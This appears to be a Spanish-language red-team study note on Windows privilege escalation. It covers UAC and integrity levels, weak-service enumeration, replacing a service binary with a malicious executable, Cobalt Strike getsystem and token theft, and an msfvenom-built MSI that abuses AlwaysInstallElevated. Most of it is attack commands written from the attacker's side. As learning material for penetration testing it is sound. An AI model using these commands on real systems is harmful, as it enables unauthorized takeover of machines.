---
tags: [privesc, windows, uac, services]
status: done
platform: windows
---

# Privilege Escalation — Windows

> Escalar de usuario estándar a SYSTEM o Administrador elevado (High Integrity).

---

## Concepto Clave: MIC + UAC

**Mandatory Integrity Control (MIC)** — niveles de integridad:
- **Low** → Procesos muy restringidos (navegadores en sandbox)
- **Medium** → Nivel por defecto, incluso para Administradores locales
- **High** → Administrador elevado (con UAC aceptado o bypassed)
- **System** → NT AUTHORITY\SYSTEM

**UAC** actúa como gatekeeping del salto Medium → High. Como atacantes no podemos hacer click en el prompt → necesitamos bypass.

---

## Servicios Débiles

### Enumeración
```powershell
# Listar todos los servicios con ruta y usuario
Get-CimInstance Win32_Service | Select-Object Name, DisplayName, State, StartMode, StartName, PathName

# Buscar servicios con exe específico
Get-CimInstance Win32_Service | Where-Object {$_.PathName -match "backup.exe"} | Select-Object Name, DisplayName, PathName

# Servicios corriendo como LocalSystem
Get-CimInstance Win32_Service | Where-Object {$_.StartName -like "*LocalSystem*"} | Select-Object Name, PathName

# Inspeccionar servicio concreto
sc qc "NombreServicio"
```

**Campos críticos a revisar:**
- `SERVICE_START_NAME` — ¿con qué usuario corre?
- `BINARY_PATH_NAME` — ¿podemos escribir en esa ruta?

### Explotación — Reemplazar binario
```powershell
# Si tenemos write sobre el binario del servicio
copy malicious.exe "C:\Program Files\Vulnerable\service.exe"
sc stop "VulnService"
sc start "VulnService"
```

### Gestión de Servicios
```
sc create "BackupSvc" binPath= "C:\malware.exe" start= demand
sc start "NombreServicio"
sc stop "NombreServicio"
```

---

## UAC Bypass (T1548.002)

> Ver [[UAC Bypasses]] para técnicas específicas.

**Concepto:** Abusar de binarios legítimos de Windows que se auto-elevan silenciosamente (auto-elevate manifest) o que cargan componentes controlables por nosotros (DLL hijacking en contexto elevado).

**Herramienta de referencia:** [UACME](https://github.com/hfiref0x/UACME) — catálogo de 65+ bypasses.

---

## Token Manipulation (ya en High Integrity)

Si ya tenemos High Integrity, el siguiente paso es ir a SYSTEM:
```
# Desde Cobalt Strike con High Integrity
beacon> getsystem          # Intenta varios métodos automáticamente
beacon> steal_token 4      # Robar token del proceso SYSTEM (PID 4 = System)
```

---

## AlwaysInstallElevated

Si ambas claves están a 1, los MSI corren como SYSTEM:
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Si ambas = 1:
```
msfvenom -p windows/x64/exec CMD=payload.exe -f msi > evil.msi
msiexec /quiet /qn /i evil.msi
```

